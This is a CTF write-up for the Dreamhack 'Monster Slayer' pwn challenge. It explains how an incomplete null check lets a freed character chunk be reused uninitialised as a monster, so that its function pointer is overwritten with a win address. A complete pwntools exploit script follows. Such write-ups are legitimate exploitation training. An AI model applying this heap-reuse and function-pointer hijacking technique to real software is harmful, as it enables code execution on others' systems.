+++
date = '2026-05-09'
draft = false
title = 'Dreamhack Monster Slayer Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
Use your power to defeat the monster.

---

This time I looked at the source code.

## Identifying the vulnerabilities

There are a couple interesting things happening here. We do have a `win` function, though.

First, let's take a look at the character and monster classes:

```c
struct Character {
    char name[0x10];
    int64_t hp;
    uint64_t type;
    char profile[0x30];
    int (*skill)();
};

struct Monster {
    char name[0x10];
    int64_t hp;
    char info[0x30];
    int (*skill)();
};
```

They are essentially the same, except that Character has an additional 8 byte `uint_64_t type`. 

These are our options:

```c
void menu() {
    puts("[1] Create Character Slot");
    puts("[2] Generate Character");
    puts("[3] Delete Character");
    puts("[4] Generate Monster");
    puts("[5] Slay Monster");
    puts("[6] Exit Game");
}
```

When creating a Character or Monster, they are `malloc`-ed. 

At a Character creation, we get an 8 byte overflow through `profile`, but it's immediately overwritten after that.

```c
 printf("Character profile: ");
    len = read(0, c1->profile, 0x38);
    if (c1->profile[len-1] == '\n') c1->profile[len-1] = '\0';

    switch (c1->type) {
        case 0: c1->skill = warrior_skill[rand() % 3]; break;
        case 1: c1->skill = mage_skill[rand() % 3]; break;
        case 2: c1->skill = archer_skill[rand() % 3]; break;
    }

    puts("\nYour character info:");
    printf("Name: %s\n", c1->name);
    printf("HP: %d\n", c1->hp);
    printf("Role: %s\n", c1->type == 0 ? "Warrior" : c1->type == 1 ? "Mage" : "Archer");
    printf("Profile: %s\n", c1->profile);
    c1->skill();
```

At the Monster creation, the same thing; The `skill` function that we might have any luck overwriting will be reset.

```c
void generate_monster(struct Monster *m1) {
    if (!is_null(m1)) return;

    int r = rand() % 3;

    strcpy(m1->name, monster_name[r]);
    m1->hp = 500;
    strcpy(m1->info, monster_info[r]);
    m1->skill = monster_skill[r];

    puts("\nMonster info:");
    printf("Name: %s\n", m1->name);
    printf("Info: %s\n", m1->info);
    printf("HP: %d\n", m1->hp);
    m1->skill();
    printf("\n");
}
```

But, before any of that happens, `is_null(m1)` is checked. Let's look at that function:

```c
int is_null(void** ptr) {
    return *ptr == NULL;
}
```

This function checks if the *first 8 bytes* of the Monster are null; if they aren't, it will have already allocated the Monster, except without overwriting any of the values inside it. 

```c
 case 4:
    if (!m) {
       m = malloc(sizeof(struct Monster));
    }
    generate_monster(m);
    break;
```

Since we have the option to delete a character (`free(c[slot]);`), let's use that.

If we create a character, free it, and then create a monster, the heap will try to reuse the freed space made by deleting the character. Let's look at how the heap will look after doing exactly this:

```bash
0x405300        0x0000000000000000      0x0000000000000061      ........a.......
0x405310        0x0000000000000405      0x0000000000000000      ................
0x405320        0x00000000000000c8      0x0000000000000002      ................
0x405330        0x0000000000414141      0x0000000000000000      AAA.............
0x405340        0x0000000000000000      0x0000000000000000      ................
0x405350        0x0000000000000000      0x0000000000000000      ................
0x405360        0x0000000000401431      0x0000000000020ca1      1.@.............         <-- Top chunk
```

Looks like it didn't reset any of the values for the Monster! This is because it checked if the first 8 bytes were null - which happened to be the `fd` left over by the character, *not* null - and abandoned the reset!

Since Character's `skill` is shifted 8 bytes compared to Monster's, we can use this to our advantage; What is, in memory, Character's last 8 bytes of `profile` will - once overlapped with Monster - become Monster's `skill` address!

So if we set this Character's profile to `0x28` of buffer and then an 8 byte address, before freeing it, we will successfully pick out a new `skill` for Monster at that address! And that will be the address of `win`, in this case.

After that, you just need to create a new character and initiate a fight, so the Monster will call the `skill` function.

Now, all that's left to do is create the script and get the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/monster/deploy/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:19081'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
win = 0x401C42

#ideea: creezi un character, apoi ii dai free;
#cand se creeaza un montstru tot acolo, verifica cu isnull()
#isnull() verifica doar primii 8 bytes sa fie null
#in heap, la momentul verificarii, slot e gol dar primii 8 bytes sunt ocupati de fd.

#practic se sare peste initializare la monstru si controlam noi skill(*)

#create slot
p.recvuntil(b">> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"1")

#create character
p.recvuntil(b">> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"1")

#character name
p.recvuntil(b": ")
p.sendline(b"gaga")

#character profile - here's where we set what will be monster's skill -or

p.recvuntil(b": ")
#difference is 8 bytes bc of uint64 type, which monster doesn't have
p.sendline(b"A"*0x28 + p64(win))


#delete character
p.recvuntil(b">> ")
p.sendline(b"3")

p.recvuntil(b": ")
p.sendline(b"1")

#create monster
p.recvuntil(b">> ")
p.sendline(b"4")

#gdb.attach(p)

#create new slot for new character
p.recvuntil(b">> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"2")

#create new character (dummy, doesn't matter)

p.recvuntil(b">> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"2")

#character name
p.recvuntil(b": ")
p.sendline(b"gaga")

#character profile
p.recvuntil(b": ")
p.sendline(b"A"*10)

#now we can fight - trigger fight - will trigger monster fake skilL!

p.recvuntil(b">> ")
p.sendline(b"5")

p.recvuntil(b": ")
p.sendline(b"2")

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/monster.py)**.
